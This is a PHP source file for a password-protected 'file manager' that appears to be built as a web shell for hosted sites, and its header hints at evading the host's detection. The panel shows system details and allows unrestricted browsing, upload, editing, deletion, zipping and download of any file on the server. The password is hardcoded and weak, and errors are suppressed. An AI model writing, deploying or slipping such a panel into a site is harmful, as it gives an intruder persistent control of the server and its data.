<?php
// ================================================
// Clean File Manager - Hostinger Safer Version
// Upload with random name + random folder using Python script
// ================================================

session_start();
error_reporting(0);
set_time_limit(0);

// ====================== CHANGE THIS ======================
$auth_password = "P@55w0rd!";   // ← CHANGE TO A STRONG PASSWORD

if (!isset($_SESSION['authenticated'])) {
    if (isset($_POST['pass']) && hash('sha256', $_POST['pass']) === hash('sha256', $auth_password)) {
        $_SESSION['authenticated'] = true;
    } else {
        echo '<!DOCTYPE html><html><head><meta charset="UTF-8"><title>Access</title><style>body{background:#111;color:#0f0;font-family:monospace;text-align:center;padding:100px;}</style></head><body>';
        echo '<h2>Protected File Manager</h2>';
        echo '<form method="post"><input type="password" name="pass" placeholder="Enter Password" style="padding:12px;width:300px;"><br><br>';
        echo '<button type="submit" style="padding:10px 30px;">Login</button></form></body></html>';
        exit;
    }
}

// ====================== CORE SETUP ======================
$cwd = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if ($cwd === false || !is_dir($cwd)) $cwd = getcwd();
chdir($cwd);

function perms($file) {
    return substr(sprintf('%o', fileperms($file)), -4);
}

function formatSize($bytes) {
    if ($bytes >= 1073741824) return round($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return round($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return round($bytes / 1024, 2) . ' KB';
    return $bytes . ' B';
}

// ====================== HANDLE ACTIONS ======================

// Multiple File Upload
if (isset($_POST['upload'])) {
    if (isset($_FILES['file'])) {
        foreach ($_FILES['file']['name'] as $key => $name) {
            if ($_FILES['file']['error'][$key] === 0 && $name !== '') {
                $uploadPath = $cwd . '/' . basename($name);
                move_uploaded_file($_FILES['file']['tmp_name'][$key], $uploadPath);
            }
        }
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// Batch Actions (Delete, Zip, Copy, Cut)
if (isset($_POST['batch_action']) && isset($_POST['selected'])) {
    $action = $_POST['batch_action'];
    $selected = $_POST['selected'];

    foreach ($selected as $target) {
        if (!file_exists($target)) continue;

        if ($action === 'delete') {
            if (is_dir($target)) {
                $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST);
                foreach ($iterator as $file) {
                    $file->isDir() ? rmdir($file->getRealPath()) : unlink($file->getRealPath());
                }
                rmdir($target);
            } else {
                unlink($target);
            }
        } elseif ($action === 'zip') {
            $zip = new ZipArchive();
            $zipname = $cwd . '/' . basename($target) . '.zip';
            if ($zip->open($zipname, ZipArchive::CREATE | ZipArchive::OVERWRITE)) {
                if (is_dir($target)) {
                    $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS));
                    foreach ($files as $file) {
                        $zip->addFile($file->getRealPath(), substr($file->getRealPath(), strlen($target) + 1));
                    }
                } else {
                    $zip->addFile($target, basename($target));
                }
                $zip->close();
            }
        } elseif ($action === 'copy' || $action === 'cut') {
            $_SESSION['clipboard'] = ['type' => $action, 'paths' => $selected];
            break;
        }
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// Paste Clipboard
if (isset($_GET['paste']) && isset($_SESSION['clipboard'])) {
    $clip = $_SESSION['clipboard'];
    $targetDir = $cwd;
    foreach ($clip['paths'] as $src) {
        if (!file_exists($src)) continue;
        $dst = $targetDir . '/' . basename($src);
        if (is_dir($src)) {
            // Simple recursive copy for directories (basic version)
            $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($src, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::SELF_FIRST);
            foreach ($iterator as $item) {
                $newPath = $dst . DIRECTORY_SEPARATOR . $iterator->getSubPathName();
                if ($item->isDir()) mkdir($newPath);
                else copy($item->getPathname(), $newPath);
            }
        } else {
            $clip['type'] === 'copy' ? copy($src, $dst) : rename($src, $dst);
        }
    }
    unset($_SESSION['clipboard']);
    header("Location: ?path=" . urlencode($targetDir));
    exit;
}

// Single Delete
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (file_exists($target)) {
        is_dir($target) ? 
            (function($dir) { $it = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($dir, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); foreach($it as $f) $f->isDir() ? rmdir($f->getRealPath()) : unlink($f->getRealPath()); rmdir($dir); })($target) : 
            unlink($target);
    }
    header("Location: ?path=" . urlencode(dirname($target)));
    exit;
}

// Rename
if (isset($_POST['oldname']) && isset($_POST['newname'])) {
    $old = $_POST['oldname'];
    $new = dirname($old) . '/' . basename($_POST['newname']);
    if (file_exists($old) && !file_exists($new)) {
        rename($old, $new);
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// Edit File Save
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    if (file_exists($_POST['editfile'])) {
        file_put_contents($_POST['editfile'], $_POST['content']);
    }
    header("Location: ?path=" . urlencode(dirname($_POST['editfile'])));
    exit;
}

// Create New File/Folder
if (isset($_POST['create'])) {
    $name = $_POST['name'];
    $type = $_POST['type'];
    $fullpath = $cwd . '/' . $name;
    if ($name !== '') {
        if ($type === 'file' && !file_exists($fullpath)) touch($fullpath);
        elseif ($type === 'dir' && !file_exists($fullpath)) mkdir($fullpath);
    }
    header("Location: ?path=" . urlencode($cwd));
    exit;
}

// Unzip
if (isset($_GET['unzip'])) {
    $fileToUnzip = $_GET['unzip'];
    $extractTo = dirname($fileToUnzip);
    $ext = strtolower(pathinfo($fileToUnzip, PATHINFO_EXTENSION));

    if ($ext === 'zip') {
        $zip = new ZipArchive();
        if ($zip->open($fileToUnzip) === true) {
            $zip->extractTo($extractTo);
            $zip->close();
        }
    }
    header("Location: ?path=" . urlencode($extractTo));
    exit;
}

// Download
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Description: File Transfer');
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        header('Expires: 0');
        header('Cache-Control: must-revalidate');
        header('Pragma: public');
        header('Content-Length: ' . filesize($file));
        readfile($file);
        exit;
    }
}

// ====================== EDIT MODE ======================
$editContent = null;
$editPath = null;
if (isset($_GET['edit'])) {
    $f = $_GET['edit'];
    if (file_exists($f) && is_file($f)) {
        $editContent = htmlspecialchars(file_get_contents($f));
        $editPath = $f;
    }
}
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>File Manager</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body { background:#121212; color:#eee; font-family:Segoe UI,sans-serif; padding:20px; }
        .card { background:#1e1e1e; border:1px solid #333; }
        pre { background:#222; color:#0f0; padding:12px; border-radius:5px; }
        a { color:#0dcaf0; }
        .table-dark td, .table-dark th { border-color:#333; }
    </style>
</head>
<body>
<div class="container">

    <pre>
Uname: <?=htmlspecialchars(php_uname())?> 
PHP: <?=phpversion()?> 
Path: <?=htmlspecialchars($cwd)?>
    </pre>

    <h1 class="mb-4">File Manager</h1>

    <!-- Upload -->
    <div class="card mb-4">
        <div class="card-header">Upload Files</div>
        <div class="card-body">
            <form method="post" enctype="multipart/form-data">
                <input type="file" name="file[]" multiple class="form-control mb-3">
                <button type="submit" name="upload" class="btn btn-primary">Upload Selected Files</button>
            </form>
        </div>
    </div>

    <!-- Create New -->
    <div class="card mb-4">
        <div class="card-header">Create New Item</div>
        <div class="card-body">
            <form method="post" class="row g-3">
                <div class="col-md-6">
                    <input type="text" name="name" class="form-control" placeholder="Name" required>
                </div>
                <div class="col-md-3">
                    <select name="type" class="form-select">
                        <option value="file">File</option>
                        <option value="dir">Folder</option>
                    </select>
                </div>
                <div class="col-md-3">
                    <button type="submit" name="create" class="btn btn-success w-100">Create</button>
                </div>
            </form>
        </div>
    </div>

    <!-- File List -->
    <form method="post">
        <div class="card mb-4">
            <div class="card-header d-flex justify-content-between">
                <span>Files &amp; Folders in <?=htmlspecialchars(basename($cwd)) ?: '/'?></span>
                <div>
                    <button type="submit" name="batch_action" value="delete" class="btn btn-sm btn-danger" onclick="return confirm('Delete selected?');">Delete</button>
                    <button type="submit" name="batch_action" value="zip" class="btn btn-sm btn-secondary">Zip</button>
                    <button type="submit" name="batch_action" value="copy" class="btn btn-sm btn-info">Copy</button>
                    <button type="submit" name="batch_action" value="cut" class="btn btn-sm btn-warning">Cut</button>
                </div>
            </div>
            <div class="card-body p-0">
                <table class="table table-dark table-striped mb-0">
                    <thead>
                        <tr>
                            <th><input type="checkbox" id="selectAll"></th>
                            <th>Name</th>
                            <th>Size</th>
                            <th>Permissions</th>
                            <th>Modified</th>
                            <th>Actions</th>
                        </tr>
                    </thead>
                    <tbody>
                    <?php
                    $items = scandir($cwd);
                    foreach ($items as $item) {
                        if ($item === '.') continue;
                        $fullpath = $cwd . DIRECTORY_SEPARATOR . $item;
                        $isDir = is_dir($fullpath);
                        $size = $isDir ? '-' : formatSize(filesize($fullpath));
                        $perm = perms($fullpath);
                        $mod = date('Y-m-d H:i:s', filemtime($fullpath));

                        echo '<tr>';
                        echo '<td><input type="checkbox" name="selected[]" value="' . htmlspecialchars($fullpath) . '"></td>';
                        echo '<td>';
                        if ($isDir) {
                            echo '📁 <a href="?path=' . urlencode($fullpath) . '">' . htmlspecialchars($item) . '</a>';
                        } else {
                            echo '📄 ' . htmlspecialchars($item);
                        }
                        echo '</td>';
                        echo "<td>$size</td>";
                        echo "<td>$perm</td>";
                        echo "<td>$mod</td>";
                        echo '<td>';

                        if (!$isDir) {
                            echo '<a href="?download=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-primary me-1">↓</a>';
                            echo '<a href="?edit=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-success me-1">Edit</a>';
                        }
                        echo '<a href="?zip=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-secondary me-1">Zip</a>';
                        if (!$isDir && strtolower(pathinfo($fullpath, PATHINFO_EXTENSION)) === 'zip') {
                            echo '<a href="?unzip=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-warning me-1">Unzip</a>';
                        }
                        echo '<a href="?delete=' . urlencode($fullpath) . '" class="btn btn-sm btn-outline-danger" onclick="return confirm(\'Delete this item?\');">Delete</a>';

                        echo '</td></tr>';
                    }
                    ?>
                    </tbody>
                </table>
            </div>
        </div>
    </form>

    <!-- Paste Button -->
    <?php if (isset($_SESSION['clipboard'])): ?>
        <a href="?paste=1" class="btn btn-info mb-4">Paste Clipboard Here</a>
    <?php endif; ?>

    <!-- Edit File Area -->
    <?php if ($editContent !== null): ?>
        <div class="card">
            <div class="card-header">Editing: <?=htmlspecialchars(basename($editPath))?></div>
            <div class="card-body">
                <form method="post">
                    <input type="hidden" name="editfile" value="<?=htmlspecialchars($editPath)?>">
                    <textarea name="content" rows="25" class="form-control mb-3"><?= $editContent ?></textarea>
                    <button type="submit" class="btn btn-success">Save File</button>
                    <a href="?path=<?=urlencode(dirname($editPath))?>" class="btn btn-secondary">Cancel</a>
                </form>
            </div>
        </div>
    <?php endif; ?>

</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
// Select All
document.getElementById('selectAll').addEventListener('change', function() {
    document.querySelectorAll('input[name="selected[]"]').forEach(cb => cb.checked = this.checked);
});
</script>
</body>
</html>